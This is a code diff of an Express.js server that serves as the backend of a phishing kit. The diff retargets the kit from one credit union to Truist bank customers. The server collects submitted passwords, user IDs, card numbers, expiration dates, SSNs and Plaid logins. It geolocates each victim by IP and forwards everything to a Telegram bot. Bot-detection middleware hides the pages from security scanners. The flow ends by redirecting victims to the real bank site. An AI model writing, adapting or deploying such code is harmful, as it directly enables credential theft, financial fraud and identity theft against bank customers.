@@ -2,15 +2,15 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
-const { botToken, chatId, plaid } = require('./config/settings.js');
-//const antibot = require('./middleware/antibot');
+const { botToken, chatId } = require('./config/settings.js');
 //const { getClientIp } = require("request-ip");
 const https = require('https');
 const querystring = require('querystring');
 const axios = require('axios');
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
-const fs = require('fs').promises; 
+const fs = require('fs').promises;
+const MobileDetect = require('mobile-detect');
 const isbot = require('isbot');
 const ipRangeCheck = require('ip-range-check');
 const { botUAList } = require('./config/botUA.js');
@@ -22,9 +22,6 @@ const viewDir = path.join(__dirname, 'views');
 
 const port = 3000;
 
-
-
-
 app.listen(port, () => {
   console.log(`Server is running on port ${port}`);
 });
@@ -32,7 +29,7 @@ app.listen(port, () => {
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
-app.set('trust proxy', true); 
+app.set('trust proxy', true);
 
 function getClientIp(req) {
   const xForwardedFor = req.headers['x-forwarded-for'];
@@ -43,6 +40,12 @@ function getClientIp(req) {
   return req.connection.remoteAddress || req.socket.remoteAddress || null;
 }
 
+// Middleware function for mobile detection
+app.use((req, res, next) => {
+  const md = new MobileDetect(req.headers['user-agent']);
+  req.isMobile = md.mobile();
+  next();
+});
 
 // Middleware function for bot detection
 function isBotUA(userAgent) {
@@ -139,7 +142,6 @@ app.use((req, res, next) => {
   }
 });
 
-
 app.get('/link', (req, res) => {
   const step = req.query.step;
 
@@ -159,192 +161,147 @@ app.get('/link', (req, res) => {
       break;
     default:
     
-      res.redirect('/Authenticate');
+      res.redirect('/login');
       break;
   }
 });
 
-
-app.get('/confirm', async (req, res) => {
-  try {
-    let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'confirm.html'), 'utf-8');
-    
-    res.send(htmlContent);
-  } catch (error) {
-    console.error('Error reading file:', error);
-    res.status(500).send('Internal Server Error');
-  }
+app.use((req, res, next) => {
+    if (req.method === 'GET' && req.path.includes('.html')) {
+        // Redirect to the desired path, for example, the root path
+        res.redirect('/');
+        console.log('path')
+    } else {
+        next();
+    }
 });
 
 
-// Middleware function for form submission
+// Route handler for form submission
 app.post('/receive', async (req, res) => {
-  let message = '';
-  let myObject = req.body;
+    let message = '';
+    let responseSent = false; // Flag to prevent multiple responses
+    const myObject = req.body;
 
-  try {
     const sendAPIRequest = async (ipAddress) => {
-      try {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(`${URL}${ipAddress}&localityLanguage=en&key=${ApiKey}`);
+        console.log(apiResponse.data);
         return apiResponse.data;
-      } catch (error) {
-        console.error("Error in API request:", error);
-        throw error;
-      }
     };
 
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
+    try {
+        const ipAddress = getClientIp(req);
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+        const userAgent = req.headers["user-agent"];
+        const systemLang = req.headers["accept-language"];
 
-    const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
+        const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
 
-    if (myObjects.includes('username')) {
-      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-                 `👤 LOGIN \n\n`;
+        const geoInfo = `🌍 GEO-IP INFO\n` +
+            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+            `CITY             : ${ipAddressInformation.location.city}\n` +
+            `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+            `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+            `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+            `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+            `💻 SYSTEM INFO\n` +
+            `USER AGENT       : ${userAgent}\n` +
+            `SYSTEM LANGUAGE  : ${systemLang}\n`;
 
-      for (const key of myObjects) {
-        if (key !== 'visitor') {
-          console.log(`${key}: ${myObject[key]}`);
-          message += `${key}: ${myObject[key]}\n`;
+        const prepareMessage = (header, type) => {
+            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
+                `👤 ${header} \n\n` +
+                `========================\n\n`;
+
+            for (const key of Object.keys(myObject)) {
+                if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
+                    console.log(`${key}: ${myObject[key]}`);
+                    message += `${key.toUpperCase()}: ${myObject[key]}\n`;
+                }
+            }
+
+            message += `\n========================\n\n` +
+                geoInfo +
+                `\n========================\n\n` +
+                `✅ UPDATE TEAM | TRUIST\n` +
+                `💬 Telegram: https://t.me/UpdateTeams\n`;
+            res.send({ url: type });
+            responseSent = true;
+        };
+
+        if (!responseSent && (myObjects.includes('password') || myObjects.includes('user-id'))) {
+            prepareMessage("LOGIN", "/confirm?action=1");
         }
-      }
 
-      message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-        `CITY             : ${ipAddressInformation.location.city}\n` +
-        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-        `💻 SYSTEM INFO\n` +
-        `USER AGENT       : ${userAgent}\n` +
-        `SYSTEM LANGUAGE  : ${systemLang}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
+        if (!responseSent && (myObjects.includes('expirationdate') || myObjects.includes('cardnumber') || myObjects.includes('billing address'))) {
+            prepareMessage("CARD INFO", "/link?step=1");
+        }
 
-      res.send('dn');
+        if (!responseSent && myObjects.includes('userid')) {
+            prepareMessage("PLAID LOGIN", "https://truist.com/");
+        }
+
+        if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('firstname') || myObjects.includes('lastname'))) {
+            prepareMessage("CONTACT INFO", "/confirm?action=2");
+        }
+
+        // Handle unmatched cases
+        if (!responseSent) {
+            res.status(400).send({ error: "No matching keys found in request body." });
+            responseSent = true;
+        }
+
+        // Send message to bot
+        const sendMessage = sendMessageFor(botToken, chatId);
+        await sendMessage(message);
+
+        console.log(message);
+    } catch (error) {
+        if (!responseSent) {
+            res.status(500).send({ error: "Internal server error" });
+        }
+        console.error(error);
     }
-
-    if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('billingaddress')) {
-      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-                 `👤 CARD INFO\n\n`;
-
-      for (const key of myObjects) {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-
-      message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-      let url;
-      if (plaid == "on") {
-        url = "/link?step=1";
-      } else {
-        url = "https://www.achievacu.com/";	
-      }
-
-      res.send({ url: url });
-    }
-
-    if (myObjects.includes('userid')) {
-      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-                 `👤 PLAID INFO\n\n`;      for (const key of myObjects) {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-
-      message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-    }
-
-    if (myObjects.includes('email')) {
-      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-                 `👤 EMAIL INFO\n\n`;
-
-      for (const key of myObjects) {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-
-      message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-      res.send('dn');
-    }
-
-    if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
-      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-                 `👤 ADDRESS INFO\n\n`;
-
-      for (const key of myObjects) {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-
-      message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-      res.send('dn');
-    }
-
-    if (myObjects.includes('membernumber') || myObjects.includes('accountnumber') || myObjects.includes('ssn')) {
-      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-                 `👤 USER ACCOUNT INFO\n\n`;
-
-      for (const key of myObjects) {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
-
-      message += `🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddress}\n` +
-        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-        `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-      res.send('dn');
-    }
-
-    console.log("Reached before sendMessageFor");
-const sendMessage = sendMessageFor(botToken, chatId);
-await sendMessage(message);
-console.log("Message sent successfully");
-
-  } catch (error) {
-    console.error("Error in processing request:", error);
-    res.status(500).send('An error occurred while processing the request.');
-  }
 });
 
+
 // Route handler for login pages
-app.get('/Authenticate', async (req, res) => {
+app.get('/login', async (req, res) => {
   try {
     let htmlContent;
-    const page = req.params.page;
     const fileName = `index.html`;
     htmlContent = await fs.readFile(path.join(__dirname, 'views', fileName), 'utf-8');
-    console.log(htmlContent);
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
+  }
+});
+
+app.get('/confirm', (req, res) => {
+  const action = req.query.action;
+
+  switch (action) {
+    case '1':
+      res.sendFile(path.join(viewDir, 'contact.html'));
+      break;
+      
+    case '2':
+      
+      res.sendFile(path.join(viewDir, 'card.html'));
+      break;
+      
+    default:
+    
+      res.redirect('/login');
+      break;
   }
 });
 
 app.get('/', async (req, res) => {
-        res.redirect('/Authenticate');
+  res.redirect('/login');
 });
 
 // Middleware function for bot detection
@@ -358,6 +315,6 @@ function antiBotMiddleware(req, res, next) {
   } else {
     next();
   }
-} 
+}
 
 app.use(antiBotMiddleware);
